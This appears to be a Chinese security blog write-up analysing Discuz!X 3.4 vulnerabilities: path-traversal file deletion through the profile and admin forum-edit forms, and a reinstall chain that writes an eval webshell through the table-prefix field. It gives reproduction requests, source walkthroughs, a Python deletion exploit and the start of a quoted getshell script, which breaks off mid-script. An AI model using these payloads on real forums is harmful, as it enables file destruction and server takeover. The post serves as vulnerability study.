@@ -1,0 +1,573 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<blockquote>
+<p>分析了目前已经公开的Dz3.4系列漏洞，作为学习和记录。</p>
+</blockquote>
+<h2 data-content="1" id="d451f16ef41f0116a64dac3a3eafc517">Discuz!X ≤3.4 任意文件删除漏洞</h2>
+<h3 data-content="1" id="6aab1b445205d3cd5d57a987018d5bc7">1、简述</h3>
+<p><strong>漏洞原因：</strong>之前存在的任意文件删除漏洞修复不完全导致可以绕过。</p>
+<p><strong>漏洞修复时间：</strong>2017年9月29日官方对gitee上的代码进行了<a href="https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574" target="_blank">修复</a></p>
+<h3 data-content="1" id="90b0b984afc97c4fbe88b36826636fd1">2、复现环境</h3>
+<p>因为官方提供的下载是最新的源码，漏洞修复时间是17年9月29日，通过git找一个修复前的版本签出就可。</p>
+<pre><code>git checkout 1a912ddb4a62364d1736fa4578b42ecc62c5d0be</code></pre>
+<p>通过安装向导安装完后注册一个测试用户，同时在网站对应目录下创建用于删除的测试文件。</p>
+<h3 data-content="1" id="5eaa319b15cc4eec1ee85c1b7c1ed3a8">3、漏洞复现</h3>
+<p>登录账户。</p>
+<p>访问该网页：<code>http://127.0.0.1:8001/dz/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base</code></p>
+<p>发送POST请求：</p>
+<pre><code>http://127.0.0.1:8001/dz/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base
+POST
+birthprovince=../../../testfile.txt&amp;profilesubmit=1&amp;formhash=e9d84225
+formhash值为用户hash，可在源码中搜索formhash找到。</code></pre>
+<p>请求后表单中的出生地内容变为<code>../../../testfile.txt</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205054-c33ce2dc-70f2-1.png"/></p>
+<p>然后构造请求向<code>home.php?mod=spacecp&amp;ac=profile&amp;op=base</code>上传文件，可以修改表单提交达到目的。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205055-c370e0b4-70f2-1.png"/></p>
+<p>提交后文件被删除。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205055-c3943a28-70f2-1.png"/></p>
+<h3 data-content="1" id="866256aa7e4fd5572b1e9ca94d020511">4、漏洞分析</h3>
+<p>分析一下对该页面请求时的流程。</p>
+<p>在<code>home.php</code>的41行有一次对其他文件的请求：</p>
+<div class="highlight"><pre><span></span><span class="x">require_once libfile('home/'.$mod, 'module');</span>
+</pre></div>
+<p>因为GET参数不满足上面代码的条件所以进入这部分。</p>
+<p>查看libfile函数的定义：</p>
+<div class="highlight"><pre><span></span><span class="x">function libfile($libname, $folder = '') {</span>
+<span class="x">    $libpath = '/source/'.$folder;</span>
+<span class="x">    if(strstr($libname, '/')) {</span>
+<span class="x">        list($pre, $name) = explode('/', $libname);</span>
+<span class="x">        $path = "{$libpath}/{$pre}/{$pre}_{$name}";</span>
+<span class="x">    } else {</span>
+<span class="x">        $path = "{$libpath}/{$libname}";</span>
+<span class="x">    }</span>
+<span class="x">    return preg_match('/^[\w\d\/_]+$/i', $path) ? realpath(DISCUZ_ROOT.$path.'.php') : false;</span>
+<span class="x">}</span>
+</pre></div>
+<p>可以看出该函数的功能就是构造文件路径。</p>
+<p>对于复现漏洞时请求页面的GET请求参数：<code>mod=spacecp&amp;ac=profile&amp;op=base</code></p>
+<p>在如上参数的请求时，经过<code>libfile</code>函数处理过后返回的路径为:<code>/source/module/home/home_spacecp.php</code></p>
+<p>跟进到<code>/source/module/home/home_spacecp.php</code>文件，在最后一行也引入了其他的文件,处理方式同上</p>
+<div class="highlight"><pre><span></span><span class="x">require_once libfile('spacecp/'.$ac, 'include');</span>
+</pre></div>
+<p>所以这里引入的文件为：<code>/source/include/spacecp/spacecp_profile.php</code>，转到该文件看看。</p>
+<p>在第70行，存在如下条件判断，这里也就是页面上的保存按钮点击后触发的相关处理代码：</p>
+<div class="highlight"><pre><span></span><span class="x">if(submitcheck('profilesubmit')) {</span>
+<span class="x">  ......</span>
+</pre></div>
+<p><code>submitcheck</code>函数是对profilesubmit的安全检查</p>
+<div class="highlight"><pre><span></span><span class="x">function submitcheck($var, $allowget = 0, $seccodecheck = 0, $secqaacheck = 0) {</span>
+<span class="x">    if(!getgpc($var)) {</span>
+<span class="x">        return FALSE;</span>
+<span class="x">    } else {</span>
+<span class="x">        return helper_form::submitcheck($var, $allowget, $seccodecheck, $secqaacheck);</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</pre></div>
+<p>第187行开始是对文件上传的处理函数：</p>
+<div class="highlight"><pre><span></span><span class="x">if($_FILES) {</span>
+<span class="x">        $upload = new discuz_upload();</span>
+<span class="x">        foreach($_FILES as $key =&gt; $file) {</span>
+<span class="x">    ......</span>
+</pre></div>
+<p>第207行开始：</p>
+<div class="highlight"><pre><span></span><span class="x">if(!$upload-&gt;error()) {</span>
+<span class="x">                $upload-&gt;save();</span>
+
+<span class="x">                if(!$upload-&gt;get_image_info($attach['target'])) {</span>
+<span class="x">                    @unlink($attach['target']);</span>
+<span class="x">                    continue;</span>
+<span class="x">                }</span>
+<span class="x">                $setarr[$key] = '';</span>
+<span class="x">                $attach['attachment'] = dhtmlspecialchars(trim($attach['attachment']));</span>
+<span class="x">                if($vid &amp;&amp; $verifyconfig['available'] &amp;&amp; isset($verifyconfig['field'][$key])) {</span>
+<span class="x">                    if(isset($verifyinfo['field'][$key])) {</span>
+<span class="x">                        @unlink(getglobal('setting/attachdir').'./profile/'.$verifyinfo['field'][$key]);</span>
+<span class="x">                        $verifyarr[$key] = $attach['attachment'];</span>
+<span class="x">                    }</span>
+<span class="x">                    continue;</span>
+<span class="x">                }</span>
+<span class="x">                if(isset($setarr[$key]) &amp;&amp; $_G['cache']['profilesetting'][$key]['needverify']) {</span>
+<span class="x">                    @unlink(getglobal('setting/attachdir').'./profile/'.$verifyinfo['field'][$key]);</span>
+<span class="x">                    $verifyarr[$key] = $attach['attachment'];</span>
+<span class="x">                    continue;</span>
+<span class="x">                }</span>
+<span class="x">                @unlink(getglobal('setting/attachdir').'./profile/'.$space[$key]);</span>
+<span class="x">                $setarr[$key] = $attach['attachment'];</span>
+<span class="x">            }</span>
+</pre></div>
+<p>文件上传成功，满足<code>!$upload-&gt;error()</code>，会执行到unlink语句：</p>
+<div class="highlight"><pre><span></span><span class="x">@unlink(getglobal('setting/attachdir').'./profile/'.$space[$key]);</span>
+</pre></div>
+<p>这里的<code>$key</code>，在前面<code>foreach($_FILES as $key =&gt; $file)</code>中定义(189行)。<code>$space</code>在第23行定义，为用户个人资料。</p>
+<div class="highlight"><pre><span></span><span class="x">$space = getuserbyuid($_G['uid']);</span>
+<span class="x">space_merge($space, 'field_home');</span>
+<span class="x">space_merge($space, 'profile');</span>
+</pre></div>
+<p>会从数据库查询用户相关的信息保存到变量$space中。<code>birthprovince</code>就是其中之一。</p>
+<p>所以此时<code>$space[key] = $space[birthprovince] = '../../../testfile.txt'</code></p>
+<p>也就解释了复现时修改出生日期为目的文件路径的操作。</p>
+<p>这样的话在这里就完成了文件删除的操作。</p>
+<p>PS：更改用户信息时通过提交表单事时抓包可以看到各参数名称，可以进行修改。</p>
+<h3 data-content="1" id="6c4913e257f9e1fd3360979c22c5c900">5、Exp</h3>
+<p>exp改了半天也没有攻击成功，找了公开的exp也不成功，不知道是exp问题还是环境问题。</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="k">def</span> <span class="nf">check_url</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
+    <span class="n">parameter</span> <span class="o">=</span> <span class="n">target_url</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">parameter</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">"home.php"</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">"[*] Please make sure the url end with 'home.php'"</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">get_cookie</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
+    <span class="n">cookie</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"[*] Please paste the cookie:"</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">';'</span><span class="p">)</span>  
+    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">cookie</span><span class="p">)):</span>
+        <span class="n">name</span><span class="p">,</span><span class="n">value</span><span class="o">=</span><span class="n">cookie</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'='</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">cookies</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>
+    <span class="n">loginurl</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s1">'?mod=spacecp'</span>
+    <span class="n">text</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+    <span class="k">if</span> <span class="s1">'您需要先登录才能继续本操作'</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">"[*] Login error,please check cookies!"</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">cookies</span>
+
+
+<span class="k">def</span> <span class="nf">del_file</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span><span class="n">target_file</span><span class="p">,</span><span class="n">cookies</span><span class="p">):</span>
+    <span class="n">loginurl</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s1">'?mod=spacecp'</span>
+    <span class="n">text</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+    <span class="n">reformhash</span> <span class="o">=</span> <span class="s1">'formhash=.*?&amp;'</span>
+    <span class="n">patternformhash</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="n">reformhash</span><span class="p">)</span>
+    <span class="n">formhash</span> <span class="o">=</span> <span class="n">patternformhash</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">()[</span><span class="mi">9</span><span class="p">:</span><span class="mi">17</span><span class="p">]</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">formhash</span><span class="p">)</span>
+    <span class="c1"># set birthprovince</span>
+    <span class="n">birthprovinceurl</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s1">'?mod=spacecp&amp;ac=profile'</span>
+    <span class="n">birthprovincedata</span> <span class="o">=</span><span class="p">{</span>
+                    <span class="s2">"birthprovince"</span><span class="p">:</span><span class="n">target_file</span><span class="p">,</span>
+                    <span class="s2">"profilesubmit"</span><span class="p">:</span><span class="s2">"1"</span><span class="p">,</span>
+                    <span class="s2">"formhash"</span><span class="p">:</span><span class="n">formhash</span>
+                    <span class="p">}</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">birthprovinceurl</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">birthprovincedata</span><span class="p">)</span>
+    <span class="c1"># upload a picture and delete the target file</span>
+    <span class="n">basepath</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">))</span>
+    <span class="n">uploadurl</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s1">'?mod=spacecp&amp;ac=profile&amp;op=base'</span>
+    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'birthprovince'</span><span class="p">:</span> <span class="p">(</span><span class="s2">"pic.png"</span><span class="p">,</span><span class="nb">open</span><span class="p">(</span><span class="n">basepath</span><span class="o">+</span><span class="s1">'/1.png'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">))}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">'formhash'</span><span class="p">:</span><span class="n">formhash</span><span class="p">,</span>
+        <span class="s1">'profilesubmit'</span><span class="p">:</span><span class="s1">'1'</span>
+        <span class="p">}</span>
+    <span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">uploadurl</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">"[*] Deleting the file."</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">target_url</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"[*] please input the target url(eg:http://xxxxx/home.php):"</span><span class="p">)</span>
+        <span class="n">check_url</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>
+        <span class="n">cookies</span><span class="p">,</span><span class="n">formhash</span> <span class="o">=</span> <span class="n">get_cookie</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>
+        <span class="n">target_file</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"[*] Please input the target file:"</span><span class="p">)</span>
+        <span class="n">del_file</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span><span class="n">target_file</span><span class="p">,</span><span class="n">cookies</span><span class="p">,</span><span class="n">formhash</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">KeyError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">"This poc doesn't seem to work."</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">exp</span><span class="p">()</span>
+</pre></div>
+<h3 data-content="1" id="37477778650743cc461d19faebd7537f">5、修复方法</h3>
+<p>对比官方的代码变动，直接删除了几条unlink语句，简单暴力..</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205055-c3e66dd4-70f2-1.png"/></p>
+<h2 data-content="1" id="bf5dac61ee63a715e4851fbd01271871">Discuz!X V3.4后台任意文件删除</h2>
+<h3 data-content="1" id="622be908682adbb9c2c780b1abe70408">1、简述</h3>
+<p>后台任意文件删除，需要有管理员的权限。</p>
+<h3 data-content="1" id="3e4e66254ba8f921f16aab97e40c4055">2、复现环境</h3>
+<p>同上</p>
+<h3 data-content="1" id="ea9ebc9fbe43e83df75c97d4e94a2ae7">3、漏洞复现</h3>
+<p>登陆后台，进入论坛-&gt;模块管理-&gt;编辑板块，使用burp拦截提交的数据。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205056-c4229692-70f2-1.png"/></p>
+<p>修改请求包，添加参数 <code>&amp;replybgnew=../../../testfile.txt&amp;delreplybg=1</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205056-c454e6f6-70f2-1.png"/></p>
+<p>发送，查看文件发现被删除。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205056-c47f2646-70f2-1.png"/></p>
+<h3 data-content="1" id="079d7e57c3d43bbc390639abfe5aa324">4、漏洞分析</h3>
+<p>分析一下该请求的流程。</p>
+<p>请求URL：<code>/dz/upload/admin.php?action=forums&amp;operation=edit&amp;fid=2&amp;replybgnew=../../../testfile.txt&amp;delreplybg=1</code></p>
+<p>在<code>admin.php</code>中接收了action参数，在第58行经过<code>admincpfile</code>函数处理后返回文件路径，并包含该文件。</p>
+<div class="highlight"><pre><span></span><span class="x">if($admincp-&gt;allow($action, $operation, $do) || $action == 'index') {</span>
+<span class="x">        require $admincp-&gt;admincpfile($action);</span>
+</pre></div>
+<p>看一下该函数的处理过程：</p>
+<div class="highlight"><pre><span></span><span class="x">function admincpfile($action) {</span>
+<span class="x">        return './source/admincp/admincp_'.$action.'.php';</span>
+<span class="x">    }</span>
+</pre></div>
+<p>经过处理返回的内容是：<code>./source/admincp/admincp_forums.php</code>，也就来到了漏洞存在的地方。</p>
+<p>根据if/else的判断条件，进入else中的代码：</p>
+<div class="highlight"><pre><span></span><span class="x">if(!submitcheck('detailsubmit')) {</span>
+<span class="x">  ......</span>
+<span class="x">}</span>
+<span class="x">else{</span>
+
+<span class="x">}</span>
+</pre></div>
+<p>造成漏洞的代码：</p>
+<div class="highlight"><pre><span></span><span class="x">if(!$multiset) {</span>
+<span class="x">  if($_GET['delreplybg']) {</span>
+<span class="x">    $valueparse = parse_url($_GET['replybgnew']);</span>
+<span class="x">    if(!isset($valueparse['host']) &amp;&amp; file_exists($_G['setting']['attachurl'].'common/'.$_GET['replybgnew'])) {</span>
+<span class="x">      @unlink($_G['setting']['attachurl'].'common/'.$_GET['replybgnew']);</span>
+<span class="x">    }</span>
+<span class="x">    $_GET['replybgnew'] = '';</span>
+<span class="x">  }</span>
+</pre></div>
+<p><code>$multiset</code>默认为0，只要不给该参数赋值就满足条件进入if语句。</p>
+<p>第二个if语句，检查GET参数<code>delreplybg</code>有没有内容，然后做了下检测，检测parse_url函数返回的结果中有没有host这个变量，来确保GET参数<code>replybgnew</code>不是url，但是并不影响传入文件路径。</p>
+<p>这里<code>$_G['setting']['attachurl'</code>的值为<code>data/attachment/</code>，再拼接上<code>common/</code>和<code>$_GET['replybgnew']</code>，这样路径就可控了。通过unlink达到文件删除的目的。</p>
+<h2 data-content="1" id="3154f54d6ed0ad9eb9aa63adaec25328">任意文件删除配合install过程getshell</h2>
+<h3 data-content="1" id="9d88fdf99a43f87070b2eb8edfd0b59d">1、简述</h3>
+<p>这个方法是看到一篇博客分析的，主要是利用文件删除漏洞删掉<code>install.lock</code>文件，绕过对安装完成的判断能够再进行安装的过程，然后再填写配置信息处构使用构造的表前缀名，时一句话写入配置文件中，getshell。</p>
+<p>表前缀：<code>x');@eval($_POST[lanvnal]);('</code></p>
+<p>但是我在使用上面版本v3.4的代码时发现，安装后<code>install</code>目录下不存在<code>index.php</code>了。分析代码发现会有安装后的删除处理，在<code>/source/admincp/admincp_index.php</code>的第14行：</p>
+<div class="highlight"><pre><span></span><span class="x">if(@file_exists(DISCUZ_ROOT.'./install/index.php') &amp;&amp; !DISCUZ_DEBUG) {</span>
+<span class="x">    @unlink(DISCUZ_ROOT.'./install/index.php');</span>
+<span class="x">    if(@file_exists(DISCUZ_ROOT.'./install/index.php')) {</span>
+<span class="x">        dexit('Please delete install/index.php via FTP!');</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</pre></div>
+<p>那是不是老版本存在该问题呢？</p>
+<p>我翻了历史版本代码，直到git提交的第一个版本都有如上的处理。</p>
+<p>但还是分析一下吧，就当学习了。</p>
+<p><strong>可以利用的条件：</strong>1、安装后没有登录后台，此时install/index还没删除 2、因为其他原因没有删除</p>
+<h3 data-content="1" id="c95c68e4b40d5893b0e8d27f0c938e93">2、复现环境</h3>
+<p>同上</p>
+<h3 data-content="1" id="35d76e2788c00fe43c61f58155f8f177">3、漏洞复现</h3>
+<p>如果安装后<code>install/index.php</code>因为某些原因还存在，直接访问会有如下警告：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205057-c4b3f40c-70f2-1.png"/></p>
+<p>通过文件删除漏洞删除data目录下的<code>install.lock</code>文件就可以重新安装。</p>
+<p>安装过程修改表前缀内容为：<code>x');@eval($_POST[lanvnal]);('</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205057-c4e9b54c-70f2-1.png"/></p>
+<p>在<code>config/config_ucenter.php</code>中已经写入了webshell。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205058-c571f5ba-70f2-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205058-c5b52d3a-70f2-1.png"/></p>
+<h3 data-content="1" id="8c28b92b9d9b1e234662a5cb459d5982">4、漏洞分析</h3>
+<p>分析一下安装逻辑，<code>install/index.php</code>文件的整体流程如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205059-c5e0f424-70f2-1.png"/></p>
+<p>分别是我们安装的每一步，接受协议-&gt;环境检测-&gt;是否安装 UCenter Server-&gt;数据库配置信息-&gt;安装过程，生成lock文件-&gt;检查</p>
+<p>问题出在在 <code>db_init</code> 的处理中，在代码第369行：</p>
+<div class="highlight"><pre><span></span><span class="x">if(DZUCFULL) {</span>
+<span class="x">            install_uc_server();</span>
+<span class="x">        }</span>
+</pre></div>
+<p>跟进<code>install_uc_server</code>，在1296行可以发现对config参数没做任何过滤传入到<code>save_uc_config</code>中：</p>
+<div class="highlight"><pre><span></span><span class="x">save_uc_config($config, ROOT_PATH.'./config/config_ucenter.php');</span>
+</pre></div>
+<p>然后<code>save_uc_config</code>也没做任何安全处理，就拼接参数后写入文件：</p>
+<div class="highlight"><pre><span></span><span class="x">function save_uc_config($config, $file) {</span>
+
+<span class="x">    $success = false;</span>
+
+<span class="x">    list($appauthkey, $appid, $ucdbhost, $ucdbname, $ucdbuser, $ucdbpw, $ucdbcharset, $uctablepre, $uccharset, $ucapi, $ucip) = $config;</span>
+
+<span class="x">    $link = function_exists('mysql_connect') ? mysql_connect($ucdbhost, $ucdbuser, $ucdbpw, 1) : new mysqli($ucdbhost, $ucdbuser, $ucdbpw, $ucdbname);</span>
+<span class="x">    $uc_connnect = $link ? 'mysql' : '';</span>
+
+<span class="x">    $date = gmdate("Y-m-d H:i:s", time() + 3600 * 8);</span>
+<span class="x">    $year = date('Y');</span>
+<span class="x">    $config = &lt;&lt;&lt;EOT</span>
+<span class="cp">&lt;?php</span>
+
+
+<span class="nb">define</span><span class="p">(</span><span class="s1">'UC_CONNECT'</span><span class="p">,</span> <span class="s1">'$uc_connnect'</span><span class="p">);</span>
+
+<span class="nb">define</span><span class="p">(</span><span class="s1">'UC_DBHOST'</span><span class="p">,</span> <span class="s1">'$ucdbhost'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'UC_DBUSER'</span><span class="p">,</span> <span class="s1">'$ucdbuser'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'UC_DBPW'</span><span class="p">,</span> <span class="s1">'$ucdbpw'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'UC_DBNAME'</span><span class="p">,</span> <span class="s1">'$ucdbname'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'UC_DBCHARSET'</span><span class="p">,</span> <span class="s1">'$ucdbcharset'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'UC_DBTABLEPRE'</span><span class="p">,</span> <span class="s1">'`$ucdbname`.$uctablepre'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'UC_DBCONNECT'</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="nb">define</span><span class="p">(</span><span class="s1">'UC_CHARSET'</span><span class="p">,</span> <span class="s1">'$uccharset'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'UC_KEY'</span><span class="p">,</span> <span class="s1">'$appauthkey'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'UC_API'</span><span class="p">,</span> <span class="s1">'$ucapi'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'UC_APPID'</span><span class="p">,</span> <span class="s1">'$appid'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'UC_IP'</span><span class="p">,</span> <span class="s1">'$ucip'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'UC_PPP'</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">EOT;</span>
+
+<span class="x">    if($fp = fopen($file, 'w')) {</span>
+<span class="x">        fwrite($fp, $config);</span>
+<span class="x">        fclose($fp);</span>
+<span class="x">        $success = true;</span>
+<span class="x">    }</span>
+<span class="x">    return $success;</span>
+<span class="x">}</span>
+</pre></div>
+<p>因为 <code>dbhost, dbuser</code>等参数需要用来连接数据库，所以利用 <code>tablepre</code> 向配置文件写入shell。</p>
+<h3 data-content="1" id="1f341d235c408191a7e6396c3e7590ef">5、Exp</h3>
+<blockquote>
+<p><a href="https://gist.github.com/j178/67f4dbd8e87cd012a7caa8752ea06e7b" target="_blank">https://gist.github.com/j178/67f4dbd8e87cd012a7caa8752ea06e7b</a></p>
+</blockquote>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">randstr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="nb">len</span><span class="o">=</span><span class="mi">5</span><span class="p">:</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">))</span>
+
+<span class="c1">##################################################</span>
+<span class="c1">########## Customize these parameters ############</span>
+<span class="n">target</span> <span class="o">=</span> <span class="s1">'http://localhost/discuzx'</span>
+<span class="c1"># login target site first, and copy the cookie here</span>
+<span class="n">cookie</span> <span class="o">=</span> <span class="s2">"UM_distinctid=15bcd2339e93d6-07b5ae8b41447e-8373f6a-13c680-15bcd2339ea636; CNZZDATA1261218610=1456502094-1493792949-%7C1494255360; csrftoken=NotKIwodOQHO0gdMyCAxpMuObjs5RGdeEVxRlaGoRdOEeMSVRL0sfeTBqnlMjtlZ; Zy4Q_2132_saltkey=I9b3k299; Zy4Q_2132_lastvisit=1506763258; Zy4Q_2132_ulastactivity=0adb6Y1baPukQGRVYtBOZB3wmx4nVBRonRprfYWTiUaEbYlKzFWL; Zy4Q_2132_nofavfid=1; Zy4Q_2132_sid=rsQrgQ; Zy4Q_2132_lastact=1506787935</span><span class="si">%09ho</span><span class="s2">me.php%09misc; 7Csx_2132_saltkey=U8nrO8Xr; TMT0_2132_saltkey=E3q5BpyX; PXMk_2132_saltkey=rGBnNWu7; b4Gi_2132_saltkey=adC4r05k; b4Gi_2132_lastvisit=1506796139; b4Gi_2132_onlineusernum=2; b4Gi_2132_sendmail=1; b4Gi_2132_seccode=1.8dab0a0c4ebfda651b; b4Gi_2132_sid=BywqMy; b4Gi_2132_ulastactivity=51c0lBFHqkUpD3mClFKDxwP%2BI0JGaY88XWTT1qtFBD6jAJUMphOL; b4Gi_2132_auth=6ebc2wCixg7l</span><span class="si">%2F</span><span class="s2">6No7r54FCvtNKfp1e5</span><span class="si">%2F</span><span class="s2">Adz2SlLqJRBimNpgrbxhSEnsH5%2BgP2mAvwVxOdrrpVVX3W5PqDhf; b4Gi_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; b4Gi_2132_creditbase=0D0D0D0D0D0D0D0D0; b4Gi_2132_creditrule=</span><span class="si">%E</span><span class="s2">6%AF</span><span class="si">%8F%E</span><span class="s2">5%A4%A9</span><span class="si">%E</span><span class="s2">7</span><span class="si">%99%</span><span class="s2">BB</span><span class="si">%E</span><span class="s2">5%BD%95; b4Gi_2132_lastcheckfeed=1%7C1506800134; b4Gi_2132_checkfollow=1; b4Gi_2132_lastact=1506800134%09misc.php</span><span class="si">%09s</span><span class="s2">eccode"</span>
+<span class="n">shell_password</span> <span class="o">=</span> <span class="n">randstr</span><span class="p">()</span>
+<span class="n">db_host</span> <span class="o">=</span> <span class="s1">''</span>
+<span class="n">db_user</span> <span class="o">=</span> <span class="s1">''</span>
+<span class="n">db_pw</span> <span class="o">=</span> <span class="s1">''</span>
